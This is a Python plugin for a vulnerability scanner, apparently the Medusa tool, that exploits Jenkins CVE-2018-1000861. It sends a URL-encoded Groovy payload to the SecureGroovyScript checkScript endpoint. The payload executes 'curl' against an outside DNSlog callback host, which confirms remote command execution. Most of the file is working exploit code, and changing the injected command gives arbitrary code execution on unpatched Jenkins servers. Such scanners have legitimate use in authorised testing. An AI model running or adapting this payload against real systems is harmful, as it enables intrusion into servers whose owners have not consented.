#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__date__ = '2019/10/13 22:12 PM'
import urllib.parse
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number'] = "CVE-2018-1000861"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-11-9"  # 插件编辑时间
        self.info['disclosure']='2019-02-23'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "JenkinsArbitraryFileReadVulnerability"  # 插件名称
        self.info['name'] ='Jenkins远程命令执行漏洞' #漏洞名称
        self.info['affects'] = "Jenkins"  # 漏洞组件
        self.info['desc_content'] = "Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新Jenkins版本"  # 修复建议
        self.info['version'] = "Jenkins 2.138.3之前版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=ClassCongregation.Proxies().result(proxies)
    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        DL=ClassCongregation.Dnslog()
        a = '''public class x {
          public x(){
            "curl %s".execute()
          }
        }''' % DL.dns_host()
        payload2 = urllib.parse.quote(a)  # url编码
        payload1 = "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value="
        payload_url = scheme + "://" + url + ':' + str(port) + payload1 + payload2
        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        resp = requests.post(payload_url,headers=headers, timeout=6, proxies=proxies,verify=False)
        con = resp.text
        if DL.result():
            Medusa = "{} Jenkins远程命令执行漏洞(CVE-2018-1000861)\r\n漏洞详情:\r\nPayload:{}\r\n返回数据包:{}\r\nDNSlog内容:{}\r\n".format(url, payload_url,con,DL.dns_host())
            _t=VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l=ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类



